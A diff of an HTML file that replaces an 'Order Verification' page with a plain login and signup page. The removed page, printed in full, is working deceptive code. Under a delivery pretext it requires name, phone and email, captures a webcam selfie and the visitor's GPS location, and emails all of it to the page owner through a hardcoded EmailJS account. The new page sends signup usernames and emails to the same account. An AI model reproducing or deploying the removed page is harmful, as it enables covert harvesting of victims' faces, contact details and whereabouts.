@@ -1,129 +1,115 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Order Verification</title>
-
-<style>
-body{
- font-family:Arial;
- text-align:center;
- padding:20px;
-}
-input{
- width:85%;
- padding:12px;
- margin:8px;
- font-size:16px;
-}
-button{
- padding:12px 20px;
- background:#28a745;
- color:white;
- border:none;
- border-radius:6px;
- font-size:16px;
- margin:6px;
-}
-video,img{
- width:300px;
- border-radius:10px;
- margin-top:10px;
-}
-</style>
-</head>
-
-<body>
-
-<h2>Order Verification</h2>
-<p>Delivery ke liye details aur selfie verification zaroori hai</p>
-
-<input type="text" id="name" placeholder="Your Name"><br>
-<input type="tel" id="phone" placeholder="Phone Number"><br>
-<input type="email" id="email" placeholder="Email Address"><br>
-
-<h3>Selfie Verification</h3>
-
-<video id="video" autoplay playsinline></video><br>
-
-<button onclick="startCamera()">Open Camera</button>
-<button onclick="captureAndSend()">Submit Order</button>
-
-<canvas id="canvas" width="300" height="220" style="display:none;"></canvas>
+<title>Login & Signup</title>
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
 <script>
-// ✅ EmailJS Init (UPDATED)
 (function(){
- emailjs.init("287g46US2fGjoY4LL");
+emailjs.init("287g46US2fGjoY4LL");
 })();
 
-let video=document.getElementById("video");
+function sendSignup(event){
+event.preventDefault();
 
-// Open Front Camera
-function startCamera(){
- navigator.mediaDevices.getUserMedia({
-   video:{facingMode:"user"}
- })
- .then(stream=>{
-   video.srcObject=stream;
- })
- .catch(()=>{
-   alert("Camera permission allow karein.");
- });
+emailjs.send("service_3ux49q7","template_5aajh27",{
+username: document.getElementById("signupUser").value,
+email: document.getElementById("signupEmail").value
+}).then(function(){
+alert("Signup request sent!");
+});
 }
 
-// Capture + Location + Email Send
-function captureAndSend(){
+function showSignup(){
+document.getElementById("loginBox").style.display="none";
+document.getElementById("signupBox").style.display="block";
+}
 
- let name=document.getElementById("name").value;
- let phone=document.getElementById("phone").value;
- let email=document.getElementById("email").value;
-
- if(name==""||phone==""||email==""){
-   alert("Please fill all details");
-   return;
- }
-
- navigator.geolocation.getCurrentPosition(function(position){
-
-   let lat=position.coords.latitude;
-   let lon=position.coords.longitude;
-
-   let canvas=document.getElementById("canvas");
-   let ctx=canvas.getContext("2d");
-
-   ctx.drawImage(video,0,0,300,220);
-
-   let selfie=canvas.toDataURL("image/jpeg",0.6);
-
-   emailjs.send(
-     "service_3ux49q7",
-     "template_3mjgsjk",
-     {
-       name:name,
-       phone:phone,
-       email:email,
-       latitude:lat,
-       longitude:lon,
-       selfie:selfie
-     }
-   )
-   .then(()=>{
-     alert("✅ Order Successfully Sent!");
-   },
-   ()=>{
-     alert("❌ Sending Failed");
-   });
-
- },
- function(){
-   alert("Location allow karna zaroori hai.");
- });
-
+function showLogin(){
+document.getElementById("signupBox").style.display="none";
+document.getElementById("loginBox").style.display="block";
 }
 </script>
+
+<style>
+
+body{
+font-family:Arial;
+background:linear-gradient(135deg,#667eea,#764ba2);
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+}
+
+.container{
+background:white;
+padding:30px;
+border-radius:10px;
+width:320px;
+box-shadow:0 10px 20px rgba(0,0,0,0.2);
+text-align:center;
+}
+
+input{
+width:90%;
+padding:10px;
+margin:10px 0;
+border:1px solid #ccc;
+border-radius:5px;
+}
+
+button{
+width:100%;
+padding:10px;
+background:#667eea;
+color:white;
+border:none;
+border-radius:5px;
+cursor:pointer;
+}
+
+a{
+cursor:pointer;
+color:#667eea;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div id="loginBox">
+
+<h2>Login</h2>
+
+<input type="text" placeholder="Username">
+<input type="password" placeholder="Password">
+<button>Login</button>
+
+<p>No account? <a onclick="showSignup()">Signup</a></p>
+
+</div>
+
+<div id="signupBox" style="display:none">
+
+<h2>Signup</h2>
+
+<form onsubmit="sendSignup(event)">
+<input type="text" id="signupUser" placeholder="Username" required>
+<input type="email" id="signupEmail" placeholder="Email" required>
+<button type="submit">Signup</button>
+</form>
+
+<p>Already account? <a onclick="showLogin()">Login</a></p>
+
+</div>
+
+</div>
 
 </body>
 </html>
